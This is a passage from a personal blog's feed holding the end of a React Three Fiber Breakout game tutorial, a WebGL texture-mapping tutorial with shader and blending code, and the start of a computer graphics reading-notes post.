javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; x, y &#125; = ballDirection;</span><br><span class="line"><span class="keyword">if</span> (distance &lt; <span class="variable constant_">RADIUS</span> &amp;&amp; intersectedObject) &#123;</span><br><span class="line">    <span class="keyword">if</span> (intersectedObject === <span class="string">&quot;paddle&quot;</span>)</span><br><span class="line">        <span class="title function_">setBallDirection</span>(<span class="keyword">new</span> <span class="title class_">Vector3</span>(x, y * -<span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">if</span> (intersectedObject === <span class="string">&quot;topWall&quot;</span>) </span><br><span class="line">        <span class="title function_">setBallDirection</span>(<span class="keyword">new</span> <span class="title class_">Vector3</span>(x, y * -<span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ([<span class="string">&quot;leftWall&quot;</span>, <span class="string">&quot;rightWall&quot;</span>].<span class="title function_">includes</span>(intersectedObject)) </span><br><span class="line">        <span class="title function_">setBallDirection</span>(<span class="keyword">new</span> <span class="title class_">Vector3</span>(x * -<span class="number">1</span>, y, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (intersectedObject === <span class="string">&quot;brick&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">setBallDirection</span>(<span class="keyword">new</span> <span class="title class_">Vector3</span>(x * -<span class="number">1</span>, y * -<span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>For a better physics experience, randomness can be added to the calculation of the reflection angle of the ball. Here is an example:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">getFlag</span> = n =&gt; n &gt; <span class="number">0</span> ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">randomReflect</span> = (<span class="params">xv, yv, <span class="keyword">from</span>, to</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> xFlag = <span class="title function_">getFlag</span>(xv);</span><br><span class="line">  <span class="keyword">let</span> yFlag = <span class="title function_">getFlag</span>(yv);</span><br><span class="line">  <span class="keyword">let</span> angle = <span class="title class_">Math</span>.<span class="title function_">random</span>() * (to - <span class="keyword">from</span>) + <span class="keyword">from</span>; </span><br><span class="line">  <span class="keyword">let</span> x = <span class="title class_">Math</span>.<span class="title function_">cos</span>(angle * <span class="title class_">Math</span>.<span class="property">PI</span> / <span class="number">180</span>);</span><br><span class="line">  <span class="keyword">let</span> y = <span class="title class_">Math</span>.<span class="title function_">sin</span>(angle * <span class="title class_">Math</span>.<span class="property">PI</span> / <span class="number">180</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Vector3</span>(<span class="title class_">Math</span>.<span class="title function_">abs</span>(x) * xFlag, <span class="title class_">Math</span>.<span class="title function_">abs</span>(y) * yFlag, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">randomLRWallReflect</span> = (<span class="params">xv, yv</span>) =&gt; <span class="title function_">randomReflect</span>(xv, yv, -<span class="number">60</span>, <span class="number">60</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">randomTBWallReflect</span> = (<span class="params">xv, yv</span>) =&gt; <span class="title function_">randomReflect</span>(xv, yv, <span class="number">30</span>, <span class="number">150</span>);</span><br></pre></td></tr></table></figure><p>The ball should bounce off the walls by reversing its x-velocity. For example, if the ball is moving to the right, when it collides with the left wall, its x-velocity should be reversed and it should start moving to the left. The same applies for the right wall.<br>On this basis, add the randomness of the angle with a range limitation.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ([<span class="string">&quot;leftWall&quot;</span>, <span class="string">&quot;rightWall&quot;</span>].<span class="title function_">includes</span>(intersectedObject)) &#123;</span><br><span class="line">    <span class="title function_">setBallDirection</span>(<span class="title function_">randomLRWallReflect</span>(x * -<span class="number">1</span>, y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Disappearing-bricks"><a href="#Disappearing-bricks" class="headerlink" title="Disappearing bricks"></a>Disappearing bricks</h2><p>The brick disappears when the ball hits it. The game ends when all the bricks disappear.<br>Remove the object from a scene by <code>scene.remove()</code>. It takes a single argument, which is the object to be removed. It removes the object from the scene and all of its associated properties, such as its position, rotation, scale, and any other properties that were set on the object.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; scene &#125; = <span class="title function_">useThree</span>();</span><br><span class="line"><span class="keyword">const</span> bricks = intersects.<span class="title function_">filter</span>(<span class="function"><span class="params">i</span> =&gt;</span> i.<span class="property">object</span>.<span class="property">name</span> === <span class="string">&quot;brick&quot;</span> &amp;&amp; i.<span class="property">distance</span> &lt; <span class="variable constant_">RADIUS</span>);</span><br><span class="line">bricks.<span class="title function_">forEach</span>(<span class="function"><span class="params">i</span> =&gt;</span> scene.<span class="title function_">remove</span>(i.<span class="property">object</span>));</span><br></pre></td></tr></table></figure><h2 id="Track-score"><a href="#Track-score" class="headerlink" title="Track score"></a>Track score</h2><p>When the ball collides with bricks, update the score according to the number of bricks.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [score, setScore] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">updateScore</span> = (<span class="params">count</span>) =&gt; <span class="title function_">setScore</span>(score + count);</span><br></pre></td></tr></table></figure><h2 id="Add-music"><a href="#Add-music" class="headerlink" title="Add music"></a>Add music</h2><p>On game events play a sound, e.g. on ball collisions. I selected free sound samples from <a href="https://test.tosound.com/">here</a>. We are going to add sound effects for: when the ball hitting the paddle, and when the ball hitting a brick.<br>Create a new <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLAudioElement/Audio">Audio()</a> object and set the source to the file that want to play, then call the play() method on the Audio() object to begin playing the sound.<br>For example:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sound = <span class="keyword">new</span> <span class="title class_">Audio</span>(<span class="string">&#x27;sound.wav&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">playSound</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    sound.<span class="property">currentTime</span> = <span class="number">0</span>;</span><br><span class="line">    sound.<span class="property">volume</span> = <span class="number">1</span>;</span><br><span class="line">    sound.<span class="title function_">play</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">playSound</span>();</span><br></pre></td></tr></table></figure><p><strong>Possible problem:</strong> <code>play() failed because the user didn‚Äòt interact with the document</code>. My solution was to add a start button.</p><h2 id="3D-view-control"><a href="#3D-view-control" class="headerlink" title="3D view control"></a>3D view control</h2><p>The <code>OrbitControls</code> component provides a convenient way to interact with a 3D scene without having to manually update the camera position. With it we can control the 3D camera which allows for panning, zooming, and rotating around a target point in all directions by mouse and touch events. </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">OrbitControls</span> autoRotateSpeed=&#123;<span class="number">0.85</span>&#125; zoomSpeed=&#123;<span class="number">0.75</span>&#125; minPolarAngle=&#123;<span class="number">1</span>&#125; maxPolarAngle=&#123;<span class="title class_">Math</span>.<span class="property">PI</span>&#125; /&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/19/LuYFsrJ9wI1HtkX.png" alt="OrbitControls.png"></p><hr><p>References:</p><ul><li><a href="https://docs.pmnd.rs/react-three-fiber/getting-started/your-first-scene">React Three Fiber</a></li><li><a href="https://codeworkshop.dev/blog/2020-06-23-build-a-game-with-react-three-fiber-and-recoil/">Build a Game with React Three Fiber and Recoil</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Games/Techniques/3D_collision_detection">3D collision detection</a></li></ul><p>üîç Check out my code in <a href="https://github.com/Beking0912/breakout"><strong>github</strong></a>.<br>üìÆ If find any errors, please feel free to discuss and correct them: <a href="mailto:&#x62;&#x73;&#x75;&#53;&#64;&#x6e;&#x63;&#115;&#x75;&#x2e;&#101;&#100;&#x75;">&#x62;&#x73;&#x75;&#53;&#64;&#x6e;&#x63;&#115;&#x75;&#x2e;&#101;&#100;&#x75;</a>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Are you a fan of classic games like Breakout, but looking to add a modern twist?&lt;br&gt;Look no further than @react-three&amp;#x2F;fiber, a power</summary>
      
    
    
    
    <category term="Coding" scheme="https://beking0912.github.io/categories/Coding/"/>
    
    
    <category term="WebGL" scheme="https://beking0912.github.io/tags/WebGL/"/>
    
    <category term="React" scheme="https://beking0912.github.io/tags/React/"/>
    
  </entry>
  
  <entry>
    <title>üßö‚Äç‚ôÄÔ∏è Computer Graphics: Texture Mapping in WebGL</title>
    <link href="https://beking0912.github.io/2022/11/11/Rendering-textured-and-transparent-models-in-WebGL/"/>
    <id>https://beking0912.github.io/2022/11/11/Rendering-textured-and-transparent-models-in-WebGL/</id>
    <published>2022-11-12T01:26:31.000Z</published>
    <updated>2023-08-04T16:54:15.863Z</updated>
    
    <content type="html"><![CDATA[<p>Texture mapping is the process of applying a 2D image to a 3D model, and is a crucial part of creating visually appealing 3D graphics. However, it can also be one of the most frustrating parts of working with WebGL, particularly when it comes to solving common problems like texture distortion or mapping errors. </p><p>In this tutorial, we‚Äôll explore the basics of texture mapping in WebGL, and provide solutions for some of the most common problems you might encounter. I hope my article can help you have a better understanding of texture mapping in WebGL.</p><h2 id="Load-Textures"><a href="#Load-Textures" class="headerlink" title="Load Textures"></a>Load Textures</h2><h3 id="Download-image"><a href="#Download-image" class="headerlink" title="Download image"></a>Download image</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">initTextures</span>(<span class="params">url</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> texture = gl.<span class="title function_">createTexture</span>();</span><br><span class="line">    gl.<span class="title function_">pixelStorei</span>(gl.<span class="property">UNPACK_FLIP_Y_WEBGL</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> image = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">    image.<span class="property">crossOrigin</span> = <span class="string">&quot;anonymous&quot;</span>;</span><br><span class="line">    image.<span class="property">src</span> = url;</span><br><span class="line">    image.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="title function_">loadTexture</span>(image, texture); &#125;</span><br><span class="line">    <span class="keyword">return</span> texture;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="‚ùìPossible-problem"><a href="#‚ùìPossible-problem" class="headerlink" title="‚ùìPossible problem"></a>‚ùìPossible problem</h4><p><strong>ERROR: The image element contains cross-origin data.</strong><br>WebGL just bans all images that are not from the same domain(CORS).<br>The easiest solution is to set the crossOrigin attribute to ‚Äúanonymous‚Äù which means ask for permission but don‚Äôt send extra info. And then when the browser tries to get the image from the server, if it‚Äôs not the same domain, the browser will ask for CORS permission. What‚Äôs more, We can make a judgement here that checks if the image we‚Äôre trying to load is on the same origin and if so sets the crossOrigin attribute.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">new</span> <span class="title function_">URL</span>(url, <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>)).<span class="property">origin</span> !== <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">origin</span>)</span><br><span class="line">    image.<span class="property">crossOrigin</span> = <span class="string">&quot;anonymous&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="gl-pixelStorei"><a href="#gl-pixelStorei" class="headerlink" title="gl.pixelStorei"></a>gl.pixelStorei</h3><p><strong>gl.pixelStorei(gl.UNPACK_FLIP_Y_WEBGL, true)</strong>: Flip the orientation of the image on the Y axis. <a href="https://developer.mozilla.org/en-US/docs/Web/API/WebGLRenderingContext/pixelStorei">[MDN]</a><br>The texture coordinates are independent of the size of the image itself, the upper right corner is always (1.0, 1.0) regardless of the image size. Browsers copy pixels from the loaded image in top-to-bottom order just like the left one, but the t-axis of the texture coordinate system in WebGL is opposite to the y-axis of the image coordinate system like the right one, so we need to flip the image first to map the image to the graphics correctly.</p><p><img src="https://s2.loli.net/2022/11/18/SoJL3aBqK7hiycj.png" alt="12.png"></p><h4 id="‚ùìPossible-problem-1"><a href="#‚ùìPossible-problem-1" class="headerlink" title="‚ùìPossible problem"></a>‚ùìPossible problem</h4><p><strong>ERROR: Still rendering in wrong order.</strong><br>I tried to invert the y-axis of the image directly using the image preprocessing functions in WebGL, named pixelStorei. But this is still different from the target output, so I did one more step, Let x be equal to 1 minus x in the vertex shader.<br><img src="https://s2.loli.net/2022/11/18/P1HnAEOamzNGk6r.png" alt="13.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gl.<span class="title function_">pixelStorei</span>(gl.<span class="property">UNPACK_FLIP_Y_WEBGL</span>, <span class="number">1</span>)</span><br><span class="line">vTexture = aTexture * <span class="title function_">vec2</span>(-<span class="number">1.0</span>, <span class="number">1.0</span>) + <span class="title function_">vec2</span>(<span class="number">1.0</span>, <span class="number">0.0</span>); </span><br><span class="line"><span class="variable constant_">OR</span> vTexture = <span class="title function_">vec2</span>(<span class="number">1.0</span> - aTexture.<span class="property">x</span>, aTexture.<span class="property">y</span>); </span><br></pre></td></tr></table></figure><p>Of course, we can also make changes directly in the vertex shader without flipping the color map.<br><img src="https://s2.loli.net/2022/11/18/1NYM8sCuScRV42i.png" alt="14.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vTexture = <span class="title function_">vec2</span>(aTexture.<span class="property">x</span>, <span class="number">1.0</span> - aTexture.<span class="property">y</span>); </span><br><span class="line">vTexture = vTexture * <span class="title function_">vec2</span>(-<span class="number">1.0</span>, <span class="number">1.0</span>) + <span class="title function_">vec2</span>(<span class="number">1.0</span>, <span class="number">0.0</span>);</span><br></pre></td></tr></table></figure><h3 id="gl-activeTexture"><a href="#gl-activeTexture" class="headerlink" title="gl.activeTexture"></a>gl.activeTexture</h3><p><strong>gl.activeTexture(gl.TEXTURE0)</strong>: Make the ‚Äútexture unit‚Äù 0 be the active texture unit. <a href="https://developer.mozilla.org/en-US/docs/Web/API/WebGLRenderingContext/activeTexture">[MDN]</a><br>WebGL uses multiple textures at the same time through texture units. Each texture unit has a number to manage a texture object, and the built-in variables gl.TEXTURE0 to gl.TEXTURE7 each represent a texture unit. Before a texture unit can be used, gl.activeTexture(gl.TEXTURE0) needs to be called to activate it. Only the active object can be modified or used.</p><h3 id="gl-bindTexture"><a href="#gl-bindTexture" class="headerlink" title="gl.bindTexture"></a>gl.bindTexture</h3><p><strong>gl.bindTexture(gl.TEXTURE_2D, texture)</strong>: Make the ‚Äútexture object‚Äù be the active texture object. <a href="https://developer.mozilla.org/en-US/docs/Web/API/WebGLRenderingContext/bindTexture">[MDN]</a><br>In WebGL we can‚Äôt manipulate texture objects directly, we have to bind texture objects to texture units and then manipulate texture objects by manipulating texture units. This also declares that the texture object will hold a texture of type gl.TEXTURE_2D. The type of the texture, gl.TEXTURE_2D, can‚Äôt be changed after this initialization. <a href="http://learnwebgl.brown37.net/10_surface_properties/texture_mapping_images.html">[learnwebgl]</a></p><h3 id="gl-texParameteri"><a href="#gl-texParameteri" class="headerlink" title="gl.texParameteri"></a>gl.texParameteri</h3><p>Configure the parameters of the texture object: how to get the texture color according to the texture coordinates, which way to repeat the texture filling. <a href="https://developer.mozilla.org/en-US/docs/Web/API/WebGLRenderingContext/texParameter">[MDN]</a> When a pixel corresponds to many texture pixels, regardless of NEARES or LINEAR, jaggedness will be a problem. The solution is to use small size textures so that each pixel does not correspond to many pixels. However, for objects close to the observer, small size textures can cause texture stretching, which looks like a blocky effect or blurring effect.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gl.<span class="title function_">texParameteri</span>(gl.<span class="property">TEXTURE_2D</span>, gl.<span class="property">TEXTURE_WRAP_S</span>, gl.<span class="property">CLAMP_TO_EDGE</span>);</span><br><span class="line">gl.<span class="title function_">texParameteri</span>(gl.<span class="property">TEXTURE_2D</span>, gl.<span class="property">TEXTURE_WRAP_T</span>, gl.<span class="property">CLAMP_TO_EDGE</span>);</span><br><span class="line">gl.<span class="title function_">texParameteri</span>(gl.<span class="property">TEXTURE_2D</span>, gl.<span class="property">TEXTURE_MAG_FILTER</span>, gl.<span class="property">LINEAR</span>);</span><br><span class="line">gl.<span class="title function_">texParameteri</span>(gl.<span class="property">TEXTURE_2D</span>, gl.<span class="property">TEXTURE_MIN_FILTER</span>, gl.<span class="property">LINEAR_MIPMAP_NEAREST</span>);</span><br></pre></td></tr></table></figure><h4 id="‚ùìPossible-problem-2"><a href="#‚ùìPossible-problem-2" class="headerlink" title="‚ùìPossible problem"></a>‚ùìPossible problem</h4><p><strong>ERROR: The texture is a non-power-of-two texture.</strong><br>In WebGL, non-power-of-two textures are allowed, but there are limitations: Mipmap cannot be used if texture is non-power-of-two. The only repeat mode allowed is gl.CLAMP_TO_EDGE.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_">isPowerOf2</span>(image.<span class="property">width</span>) &amp;&amp; <span class="title function_">isPowerOf2</span>(image.<span class="property">height</span>)) &#123; </span><br><span class="line">    <span class="comment">// Yes, it&#x27;s a power of 2. Generate mips. </span></span><br><span class="line">    gl.<span class="title function_">generateMipmap</span>(gl.<span class="property">TEXTURE_2D</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="comment">// No, it&#x27;s not a power of 2. Turn off mips and set </span></span><br><span class="line">    gl.<span class="title function_">texParameteri</span>(gl.<span class="property">TEXTURE_2D</span>, gl.<span class="property">TEXTURE_WRAP_S</span>, gl.<span class="property">CLAMP_TO_EDGE</span>); </span><br><span class="line">    gl.<span class="title function_">texParameteri</span>(gl.<span class="property">TEXTURE_2D</span>, gl.<span class="property">TEXTURE_WRAP_T</span>, gl.<span class="property">CLAMP_TO_EDGE</span>); </span><br><span class="line">    gl.<span class="title function_">texParameteri</span>(gl.<span class="property">TEXTURE_2D</span>, gl.<span class="property">TEXTURE_MIN_FILTER</span>, gl.<span class="property">LINEAR</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="gl-texImage2D"><a href="#gl-texImage2D" class="headerlink" title="gl.texImage2D"></a>gl.texImage2D</h3><p><strong>gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, image)</strong>: Store in the image in the GPU‚Äôs texture object. <a href="https://developer.mozilla.org/en-US/docs/Web/API/WebGLRenderingContext/texImage2D">[MDN]</a><br>Assigns a texture image to a texture object, and this function also allows to tell the WebGL system about some properties of the image.</p><h3 id="gl-uniform1"><a href="#gl-uniform1" class="headerlink" title="gl.uniform1*"></a>gl.uniform1*</h3><p><strong>gl.uniform1i(uniformVar, texUnit)</strong>: Specify the texture unit number and pass it to the corresponding texture uniform variable.</p><h4 id="‚ùìPossible-problem-3"><a href="#‚ùìPossible-problem-3" class="headerlink" title="‚ùìPossible problem"></a>‚ùìPossible problem</h4><p><strong>ERROR: Uniform type does not match uniform method.</strong><br>gl.uniform1f(u_alpha, alpha): A floating point Number for floating point values.<br>gl.uniform1i: An integer Number for integer values.<br>Prone to typo. In my case, the value of alpha is a single floating point number, so the corresponding uniform variable is set using gl.uniform1f. </p><h2 id="Texture-Mapping"><a href="#Texture-Mapping" class="headerlink" title="Texture Mapping"></a>Texture Mapping</h2><p><img src="https://s2.loli.net/2022/11/18/T9XjlZYQqz12UN6.png" alt="15.png"></p><h2 id="Update-Shaders"><a href="#Update-Shaders" class="headerlink" title="Update Shaders"></a>Update Shaders</h2><p>In the vertex shader, creating a varying variable that will interpolate the texture coordinates across the surface of a triangle. In the fragment shader, use the texture coordinates to lookup a color from the texture image. <a href="http://learnwebgl.brown37.net/10_surface_properties/texture_mapping_images.html">[learnwebgl]</a></p><h3 id="Vertex-Shader"><a href="#Vertex-Shader" class="headerlink" title="Vertex Shader"></a>Vertex Shader</h3><p>Define vertex shader in essl using es6 template strings. Two things will be done here: pass the texture unit to the slice shader; transfer texture coordinates from vertex shader to vertex shader.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> vShaderCode = `</span><br><span class="line">    attribute vec4 aVertexPosition;</span><br><span class="line">    attribute vec2 aTextureCoord;</span><br><span class="line"></span><br><span class="line">    uniform mat4 uModelViewMatrix;</span><br><span class="line">    uniform mat4 uProjectionMatrix;</span><br><span class="line"></span><br><span class="line">    varying highp vec2 vTextureCoord;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">      gl_Position = uProjectionMatrix * uModelViewMatrix * aVertexPosition;</span><br><span class="line">      vTextureCoord = aTextureCoord;</span><br><span class="line">    &#125;</span><br><span class="line">`;</span><br></pre></td></tr></table></figure><h3 id="Fragment-Shader"><a href="#Fragment-Shader" class="headerlink" title="Fragment Shader"></a>Fragment Shader</h3><p>Define fragment shader in essl using es6 template strings. The GLSL ES built-in function texture2D() is used to get the pixel color from the texture map image by fetching the texel on the texture based on the value of the texture coordinates.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> fsSource = `</span><br><span class="line">    varying highp vec2 vTextureCoord;</span><br><span class="line"></span><br><span class="line">    uniform sampler2D uSampler;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">      gl_FragColor = texture2D(uSampler, vTextureCoord);</span><br><span class="line">    &#125;</span><br><span class="line">`;</span><br></pre></td></tr></table></figure><h2 id="Depth-Test"><a href="#Depth-Test" class="headerlink" title="Depth Test"></a>Depth Test</h2><p>By default, WebGL handles vertices in the order they are in the buffer in order to speed up drawing operations. If a vertex that is close is drawn first and a vertex that is far away is drawn later, the object that is far away that is drawn later obscures the object that is close instead. Depth monitoring takes the color of the pixel with the smaller z-value as the final drawn color, unless transparent objects need to be drawn, and depth detection is usually turned on.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gl.<span class="title function_">enable</span>(gl.<span class="property">DEPTH_TEST</span>); </span><br><span class="line">gl.<span class="title function_">disable</span>(gl.<span class="property">DEPTH_TEST</span>);</span><br></pre></td></tr></table></figure><h2 id="Alpha-Blending"><a href="#Alpha-Blending" class="headerlink" title="Alpha Blending"></a>Alpha Blending</h2><p>WebGL does not provide alpha blending by default, to turn on alpha blending, WebGL needs to use the source and target colors, and the blended color is calculated by the blending method set in gl.blendFunc. If the 3D scene is drawn with both opaque and translucent objects, the graphics should be drawn as following:</p><ul><li>Enable the hidden surface elimination: gl.enable(gl.DEPTH_TEST);</li><li>Draw all opaque objects;</li><li>Lock the write operation of the depth buffer used for hidden surface elimination so that it is read-only: gl.depthMask(false);</li><li>Draw all translucent objects, noting that they are to be sorted by depth and then drawn from back to front;</li><li>Release the depth buffer to make it readable and writable: gl.depthMask(true).<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (alpha == <span class="number">1</span>) &#123;</span><br><span class="line">    gl.<span class="title function_">disable</span>(gl.<span class="property">BLEND</span>);</span><br><span class="line">    gl.<span class="title function_">depthMask</span>(<span class="literal">true</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    gl.<span class="title function_">enable</span>(gl.<span class="property">BLEND</span>); <span class="comment">// enable alpha blending</span></span><br><span class="line">    gl.<span class="title function_">blendFunc</span>(gl.<span class="property">SRC_ALPHA</span>, gl.<span class="property">ONE_MINUS_SRC_ALPHA</span>); <span class="comment">// premultiplied</span></span><br><span class="line">    gl.<span class="title function_">depthMask</span>(<span class="literal">false</span>); <span class="comment">// disable depth mask</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><hr><p>References:</p><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/WebGL_API/Tutorial/Using_textures_in_WebGL#updating_the_shaders">Using textures in WebGL</a></li><li><a href="http://learnwebgl.brown37.net/10_surface_properties/texture_mapping_images.html">Texture Mapping Using Images</a></li><li><a href="https://zhuanlan.zhihu.com/p/150958567">WebGL textures</a></li><li><a href="http://www.dwenzhao.cn/profession/netbuild/html5webgl.html">WebGL programming</a></li></ul><p>üìÆ If find any errors, please feel free to discuss and correct them: <a href="mailto:&#x62;&#x73;&#117;&#x35;&#64;&#x6e;&#x63;&#115;&#117;&#46;&#101;&#100;&#x75;">&#x62;&#x73;&#117;&#x35;&#64;&#x6e;&#x63;&#115;&#117;&#46;&#101;&#100;&#x75;</a>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Texture mapping is the process of applying a 2D image to a 3D model, and is a crucial part of creating visually appealing 3D graphics. Ho</summary>
      
    
    
    
    <category term="Coding" scheme="https://beking0912.github.io/categories/Coding/"/>
    
    
    <category term="WebGL" scheme="https://beking0912.github.io/tags/WebGL/"/>
    
  </entry>
  
  <entry>
    <title>üìñ Reading Reactions: Principles of Computer Graphics</title>
    <link href="https://beking0912.github.io/2022/10/17/Reading-Reactions-Principles-of-Computer-Graphics/"/>
    <id>https://beking0912.github.io/2022/10/17/Reading-Reactions-Principles-of-Computer-Graphics/</id>
    <published>2022-10-18T01:07:38.000Z</published>
    <updated>2023-02-19T19:16:13.972Z</updated>
    
    <content type="html"><![CDATA[<p>This document is to record my reading reactions after reading the book Fundamentals of Computer Graphics on the course <em><strong>CSC 570: Principles of Computer Graphics</strong></em> I took in my first semester. I benefited a lot from this course and also programmed some interesting projects. If you find any errors, please feel free to discuss and correct them: <a href="mailto:&#98;&#x73;&#x75;&#53;&#x40;&#x6e;&#x63;&#x73;&#117;&#46;&#x65;&#x64;&#117;">&#98;&#x73;&#x75;&#53;&#x40;&#x6e;&#x63;&#x73;&#117;&#46;&#x65;&#x64;&#117;</a>. üòä As an introductory Computer Graphics scholar, I would recommend the following resources.</p><ul><li><em><strong>Fundamentals of Computer Graphics</strong></em> Marshner &amp; Shirley. (2016)</li><li><em><strong>Interactive 3D Graphics</strong></em> Udacity <a href="https://www.youtube.com/playlist?list=PLAwxTw4SYaPlaHwnoGxJE7NFhEWRCIyet">youtube</a></li></ul><h2 id="09-x2F-01-x2F-2022-History"><a href="#09-x2F-01-x2F-2022-History" class="headerlink" title="09&#x2F;01&#x2F;2022 - History"></a>09&#x2F;01&#x2F;2022 - History</h2><p><em><strong>Four decades of computer graphics</strong></em><br>As a beginner in this discipline, reading this paper presented me with the challenge of understanding the terminology, so I also spent some extra time searching for it to find a better understanding. Prior to reading it, I simply assumed that computer graphics is primarily 